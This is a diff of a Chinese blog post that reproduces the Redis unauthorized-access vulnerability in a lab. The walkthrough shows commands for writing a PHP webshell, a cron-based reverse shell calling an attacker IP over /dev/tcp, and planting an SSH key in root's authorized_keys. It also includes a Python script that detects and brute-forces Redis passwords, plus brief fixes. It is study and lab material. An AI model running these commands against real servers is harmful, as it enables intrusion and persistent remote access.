@@ -45,7 +45,7 @@
         content="2021-06-28">
       <meta 
         property="og:article:modified_time" 
-        content="2021-07-21">
+        content="2021-08-09">
       <meta 
         property="og:article:author" 
         content="沉墨">
@@ -53,7 +53,7 @@
         
           <meta 
             property="og:article:tag" 
-            content="Redis未授权访问">
+            content="Redis">
         
       
     
@@ -270,7 +270,7 @@
     </h1>
   </header>
   <div class="post-meta post-show-meta">
-    <time datetime="2021-06-28T13:05:09.000Z">
+    <time datetime="2021-06-28T08:25:09.000Z">
       <i 
         class="iconfont icon-calendar" 
         style="margin-right: 2px;">
@@ -304,9 +304,9 @@
         
           
           <a 
-            href="/tags/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" 
+            href="/tags/Redis/" 
             class="post-meta-link">
-            Redis未授权访问
+            Redis
           </a>
         
       </div>
@@ -345,22 +345,22 @@
 <p>4、启动</p>
 <pre class="highlight"><span class="line">./redis-server		#src目录</span><br></pre>
 
-<p><img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210702081136207.png" alt="image-20210702081136207.png" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210702081136207.png" class="lozad post-image"></p>
+<p><img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162755821.png" alt="image-20210809162755821" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162755821.png" class="lozad post-image"></p>
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="无密码登录"><a href="#无密码登录" class="headerlink" title="无密码登录"></a>无密码登录</h3><pre class="highlight"><span class="line">redis-cli -h 192.168.24.79		#登录</span><br></pre>
 
-<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210702081439554.png" alt="image-20210702081439554" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210702081439554.png" class="lozad post-image"></p>
+<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162803617.png" alt="image-20210809162803617" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162803617.png" class="lozad post-image"></p>
 <p>登陆成功</p>
 <h3 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h3><p>前提：登陆成功、知道路径（phpinfo或错误暴路径等）、读写权限等</p>
 <p>因为没有搭建网站环境，这里写在用户根目录</p>
 <pre class="highlight"><span class="line">config set dir /home/chen/</span><br><span class="line">config set dbfilename redis.php	</span><br><span class="line">set webshell &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">或</span><br><span class="line">set x &quot;\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n&quot;</span><br><span class="line">save</span><br></pre>
 
-<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210702082718934.png" alt="image-20210702082718934" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210702082718934.png" class="lozad post-image"></p>
+<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162814551.png" alt="image-20210809162814551" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162814551.png" class="lozad post-image"></p>
 <p>靶机成功写入</p>
-<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210702082834213.png" alt="image-20210702082834213" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210702082834213.png" class="lozad post-image"></p>
+<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162823433.png" alt="image-20210809162823433" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162823433.png" class="lozad post-image"></p>
 <h3 id="定时反弹shell"><a href="#定时反弹shell" class="headerlink" title="定时反弹shell"></a>定时反弹shell</h3><p>需要管理员权限</p>
 <pre class="highlight"><span class="line">nc -lvnp 4444		# 攻击机开启监听</span><br><span class="line"></span><br><span class="line"># 连接redis，写定时反弹shell</span><br><span class="line">redis-cli -h 192.168.24.79</span><br><span class="line">config set dir /var/spool/cron/crontabs</span><br><span class="line">config set dbfilename root</span><br><span class="line">set xxx &quot;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.24.82/4444 0&gt;&amp;1\n\n&quot;		#每分钟执行一次反弹连接</span><br><span class="line">save</span><br></pre>
 
-<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210702084716304.png" alt="image-20210702084716304" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210702084716304.png" class="lozad post-image"></p>
+<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162930370.png" alt="image-20210809162930370" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162930370.png" class="lozad post-image"></p>
 <p>注意！</p>
 <p>1、Ubuntu系统需要以管理员权限更改/bin下的软链接指向</p>
 <pre class="highlight"><span class="line">ln -s -f bash /bin/sh		# 定时任务bash为dash,无交互功能</span><br></pre>
@@ -370,7 +370,7 @@
 <pre class="highlight"><span class="line">chmod 600 root</span><br></pre>
 
 <p>解决以上坑点，成功反弹shell</p>
-<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210702230552921.png" alt="image-20210702230552921" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210702230552921.png" class="lozad post-image"></p>
+<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162939325.png" alt="image-20210809162939325" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162939325.png" class="lozad post-image"></p>
 <p>但是这样意义不大，据说centos无以上坑点。</p>
 <h3 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录"></a>ssh登录</h3><p>1、攻击机生成ssh密钥（空密码）</p>
 <pre class="highlight"><span class="line">ssh-keygen -t rsa		# 全部回车</span><br><span class="line">cd .ssh/</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt		# 写入公钥</span><br></pre>
@@ -382,19 +382,15 @@
 <pre class="highlight"><span class="line">redis-cli -h 192.168.24.79</span><br><span class="line">config set dir /root/.ssh					# 默认公私钥路径</span><br><span class="line">config set dbfilename authorized_keys		# 写入authorized_keys</span><br><span class="line">save</span><br></pre>
 
 <p>4、检查靶机文件是否写入–已写入（同样带有乱码）</p>
-<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210703101552835.png" alt="image-20210703101552835" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210703101552835.png" class="lozad post-image"></p>
+<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162954548.png" alt="image-20210809162954548" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809162954548.png" class="lozad post-image"></p>
 <p>5、攻击机进行ssh连接</p>
 <pre class="highlight"><span class="line">ssh -o StrictHostKeyChecking=no 192.168.24.79		# 首次连接需要加-o StrictHostKeyChecking=no</span><br></pre>
 
-<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210703102221333.png" alt="image-20210703102221333" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210703102221333.png" class="lozad post-image"></p>
+<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809163005569.png" alt="image-20210809163005569" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809163005569.png" class="lozad post-image"></p>
 <p>连接成功</p>
 <p>（注：靶机需要安装ssh服务并关闭防火墙，或者允许22端口通过防火墙）</p>
 <p>附Ubuntu安装ssh</p>
 <pre class="highlight"><span class="line">sudo apt-get install openssh-server		# 安装ssh</span><br><span class="line">sudo /etc/init.d/ssh start 				# 开启ssh</span><br><span class="line">ufw allow 22/tcp						# 允许通过防火墙</span><br><span class="line">或</span><br><span class="line">sudo ufw disable						# 不建议</span><br></pre>
-
-
-
-
 
 <h3 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h3><p>redis:4.x - redis:5.0.5版本漏洞，redis开启主从复制，主从数据相同，主redis只写，从redis只读，从而减小服务器压力。在Redis 4.x之后，Redis新增了模块功能，通过外部拓展，可以在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载so恶意文件，就可以拓展新命令。</p>
 <p>到这里懒癌犯了，不想搭环境了，附上脚本下载链接，直接过，遇到回头再来。</p>
@@ -404,26 +400,49 @@
 <h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><p>感觉这个比较实用，弱口令yyds！</p>
 <p>准备：</p>
 <p>打开redis.conf配置文件，找到requirepass，去掉注释，修改后面的参数，即为密码</p>
-<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210703105503697.png" alt="image-20210703105503697" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210703105503697.png" class="lozad post-image"></p>
+<p> <img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809163040446.png" alt="image-20210809163040446" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809163040446.png" class="lozad post-image"></p>
 <p>密码登录</p>
 <pre class="highlight"><span class="line">redis-cli -h 192.168.24.79 -a password</span><br></pre>
-
-
 
 <p>以上，开始编写Python脚本</p>
 <pre class="highlight"><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">    描述：redis未授权访问探测 + 密码爆破</span><br><span class="line">    author: chen</span><br><span class="line">    date: 2021-07-03</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">import threading</span><br><span class="line">import queue</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def poc():</span><br><span class="line">    global flag</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((ip, port))</span><br><span class="line">    # 发送INFO，如果无密码则返回服务器信息，包含版本信息；如果有密码，则返回“-NOAUTH Authentication required”</span><br><span class="line">    s.send(&#x27;INFO\r\n&#x27;.encode(&#x27;utf-8&#x27;))</span><br><span class="line">    result = s.recv(1024).decode(&#x27;utf-8&#x27;)</span><br><span class="line">    if &quot;redis_version&quot; in result:</span><br><span class="line">        print(&quot;存在redis未授权访问漏洞！&quot;)</span><br><span class="line">        flag = True</span><br><span class="line">    elif &quot;Authentication&quot; in result:</span><br><span class="line">        flag = False</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;未知错误&quot;)</span><br><span class="line">        flag = None</span><br><span class="line">    s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def burst():</span><br><span class="line">    while not q.empty():</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((ip, port))</span><br><span class="line">        _pass = q.get()</span><br><span class="line">        msg = &quot;AUTH &quot; + _pass + &quot;\r\n&quot;          # AUTH pass 为redis密码格式</span><br><span class="line">        s.send(msg.encode(&#x27;utf-8&#x27;))</span><br><span class="line">        result = s.recv(1024).decode(&#x27;utf-8&#x27;)</span><br><span class="line">        if &#x27;+OK&#x27; in result:</span><br><span class="line">            print(&quot;存在弱口令，密码为%s&quot; % _pass)</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    if len(sys.argv) != 5:</span><br><span class="line">        print(&quot;请按照格式输出：\n&quot;)</span><br><span class="line">        print(&quot;redis.py 10.10.10.10 6379 字典名 线程数 \n&quot;)</span><br><span class="line"></span><br><span class="line">    flag = True</span><br><span class="line">    q = queue.Queue()</span><br><span class="line"></span><br><span class="line">    ip = sys.argv[1]</span><br><span class="line">    port = int(sys.argv[2])</span><br><span class="line">    dic = sys.argv[3]</span><br><span class="line">    thread = sys.argv[4]</span><br><span class="line"></span><br><span class="line">    poc()</span><br><span class="line"></span><br><span class="line">    if flag:</span><br><span class="line">        exit()</span><br><span class="line">    else:</span><br><span class="line">        path = os.path.dirname(os.path.realpath(__file__))      # 获取当前脚本目录</span><br><span class="line">        for i in open(path + &#x27;/&#x27; + dic):</span><br><span class="line">            q.put(i.strip())                                    # 清洗字符，去掉头尾的换行和空格</span><br><span class="line">        for i in range(int(thread)):</span><br><span class="line">            t = threading.Thread(target=burst(), daemon=True)</span><br><span class="line">            t.start()</span><br><span class="line"></span><br><span class="line">    while True:</span><br><span class="line">        pass</span><br></pre>
 
 <p>结果：</p>
 <p>空密码：</p>
-<p><img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210703153927019.png" alt="image-20210703153927019" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210703153927019.png" class="lozad post-image"></p>
+<p><img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809163058335.png" alt="image-20210809163058335" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809163058335.png" class="lozad post-image"></p>
 <p>设置密码</p>
-<p><img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210703153726385.png" alt="image-20210703153726385" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210703153726385.png" class="lozad post-image"></p>
+<p><img src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809163105143.png" alt="image-20210809163105143" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20210809163105143.png" class="lozad post-image"></p>
+<p>————————————————————————————————————————————————————————————</p>
+<p>修改脚本，链接：</p>
+<p><a href="https://www.zerochen.top/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/">Pocsuite3重写redis脚本 (zerochen.top)</a></p>
 <h1 id="四、修复"><a href="#四、修复" class="headerlink" title="四、修复"></a>四、修复</h1><h2 id="指定ip登录"><a href="#指定ip登录" class="headerlink" title="指定ip登录"></a>指定ip登录</h2><p>在redis.conf文件找到# bind 127.0.0.1，去掉注释，修改为指定的登录ip</p>
 <p>缺点：多点登陆失效。</p>
 <h2 id="增加密码"><a href="#增加密码" class="headerlink" title="增加密码"></a>增加密码</h2><p>打开redis.conf配置文件，找到requirepass，去掉注释，修改后面的参数，即为密码</p>
 
   </div>
   <div>
+    
+      <div 
+        class="post-note note-warning copyright" 
+        style="margin-top: 42px">
+        <p>
+          <span style="font-weight: bold;">作者：</span><a 
+            target="_blank" 
+            rel="nofollow noopener noreferrer" 
+            href="/about">
+            沉墨
+          </a>
+        </p>
+        <p>
+          <span style="font-weight: bold;">文章链接：</span><a 
+            target="_blank" 
+            rel="nofollow noopener noreferrer" 
+            href="https://www.zerochen.top/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+            https://www.zerochen.top/article/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/
+          </a>
+        </p>
+        <p><span style="font-weight: bold;">版权声明：</span>转载请注明出处！</p>
+      </div>
     
   </div>
 </article>
@@ -517,24 +536,24 @@
     alt="author avatar">
 
 <p class="author-name">沉墨</p>
-<p class="author-description">努力成为一个Python脚本小子</p>
+<p class="author-description">谨言多思，野蛮生长</p>
 <div class="author-message">
   <a 
     class="author-posts-count" 
     href="/archives">
-    <span>26</span>
+    <span>43</span>
     <span>文章</span>
   </a>
   <a 
     class="author-categories-count" 
     href="/categories">
-    <span>8</span>
+    <span>9</span>
     <span>分类</span>
   </a>
   <a 
     class="author-tags-count" 
     href="/tags">
-    <span>26</span>
+    <span>43</span>
     <span>标签</span>
   </a>
 </div>
@@ -566,24 +585,31 @@
   </div>
   <div class="categories-list">
     
-      <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+      <a href="/categories/Web%E6%B8%97%E9%80%8F/">
         <div class="categories-list-item">
-          漏洞复现
-          <span class="categories-list-item-badge">4</span>
-        </div>
-      </a>
-    
-      <a href="/categories/%E9%99%84%E5%8A%A0/">
-        <div class="categories-list-item">
-          附加
-          <span class="categories-list-item-badge">2</span>
+          Web渗透
+          <span class="categories-list-item-badge">20</span>
         </div>
       </a>
     
       <a href="/categories/%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/">
         <div class="categories-list-item">
           编程基础
-          <span class="categories-list-item-badge">1</span>
+          <span class="categories-list-item-badge">3</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/">
+        <div class="categories-list-item">
+          网络基础
+          <span class="categories-list-item-badge">2</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+        <div class="categories-list-item">
+          漏洞复现
+          <span class="categories-list-item-badge">5</span>
         </div>
       </a>
     
@@ -594,17 +620,10 @@
         </div>
       </a>
     
-      <a href="/categories/Web%E6%B8%97%E9%80%8F/">
-        <div class="categories-list-item">
-          Web渗透
-          <span class="categories-list-item-badge">5</span>
-        </div>
-      </a>
-    
       <a href="/categories/Linux/">
         <div class="categories-list-item">
           Linux
-          <span class="categories-list-item-badge">2</span>
+          <span class="categories-list-item-badge">1</span>
         </div>
       </a>
     
@@ -618,6 +637,13 @@
       <a href="/categories/Windows/">
         <div class="categories-list-item">
           Windows
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E9%99%84%E5%8A%A0%E6%8A%80%E8%83%BD/">
+        <div class="categories-list-item">
+          附加技能
           <span class="categories-list-item-badge">1</span>
         </div>
       </a>
@@ -643,27 +669,63 @@
       </a>
     
       <a 
-        href="/tags/hexo%E5%8D%9A%E5%AE%A2/" 
-        title="hexo博客">
-        <div class="tags-list-item">hexo博客</div>
+        href="/tags/Redis/" 
+        title="Redis">
+        <div class="tags-list-item">Redis</div>
       </a>
     
       <a 
-        href="/tags/%E7%9B%B4%E6%92%AD%E6%8E%A8%E6%B5%81%E5%B9%B3%E5%8F%B0/" 
-        title="直播推流平台">
-        <div class="tags-list-item">直播推流平台</div>
+        href="/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" 
+        title="逻辑漏洞">
+        <div class="tags-list-item">逻辑漏洞</div>
       </a>
     
       <a 
-        href="/tags/Nginx%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" 
-        title="Nginx环境搭建">
-        <div class="tags-list-item">Nginx环境搭建</div>
+        href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" 
+        title="网络协议">
+        <div class="tags-list-item">网络协议</div>
       </a>
     
       <a 
-        href="/tags/LAMP/" 
-        title="LAMP">
-        <div class="tags-list-item">LAMP</div>
+        href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" 
+        title="文件包含">
+        <div class="tags-list-item">文件包含</div>
+      </a>
+    
+      <a 
+        href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" 
+        title="文件上传">
+        <div class="tags-list-item">文件上传</div>
+      </a>
+    
+      <a 
+        href="/tags/%E5%8D%9A%E5%AE%A2/" 
+        title="博客">
+        <div class="tags-list-item">博客</div>
+      </a>
+    
+      <a 
+        href="/tags/%E7%9B%B4%E6%92%AD%E6%8E%A8%E6%B5%81/" 
+        title="直播推流">
+        <div class="tags-list-item">直播推流</div>
+      </a>
+    
+      <a 
+        href="/tags/Nginx/" 
+        title="Nginx">
+        <div class="tags-list-item">Nginx</div>
+      </a>
+    
+      <a 
+        href="/tags/Apache/" 
+        title="Apache">
+        <div class="tags-list-item">Apache</div>
+      </a>
+    
+      <a 
+        href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" 
+        title="命令执行">
+        <div class="tags-list-item">命令执行</div>
       </a>
     
       <a 
@@ -679,57 +741,21 @@
       </a>
     
       <a 
+        href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" 
+        title="信息收集">
+        <div class="tags-list-item">信息收集</div>
+      </a>
+    
+      <a 
         href="/tags/DVWA/" 
         title="DVWA">
         <div class="tags-list-item">DVWA</div>
       </a>
     
       <a 
-        href="/tags/IIS/" 
-        title="IIS">
-        <div class="tags-list-item">IIS</div>
-      </a>
-    
-      <a 
-        href="/tags/Java%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" 
-        title="Java环境配置">
-        <div class="tags-list-item">Java环境配置</div>
-      </a>
-    
-      <a 
-        href="/tags/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97/" 
-        title="Shiro反序列">
-        <div class="tags-list-item">Shiro反序列</div>
-      </a>
-    
-      <a 
-        href="/tags/Vulhub/" 
-        title="Vulhub">
-        <div class="tags-list-item">Vulhub</div>
-      </a>
-    
-      <a 
-        href="/tags/SQL%E6%B3%A8%E5%85%A5/" 
-        title="SQL注入">
-        <div class="tags-list-item">SQL注入</div>
-      </a>
-    
-      <a 
-        href="/tags/Python3/" 
-        title="Python3">
-        <div class="tags-list-item">Python3</div>
-      </a>
-    
-      <a 
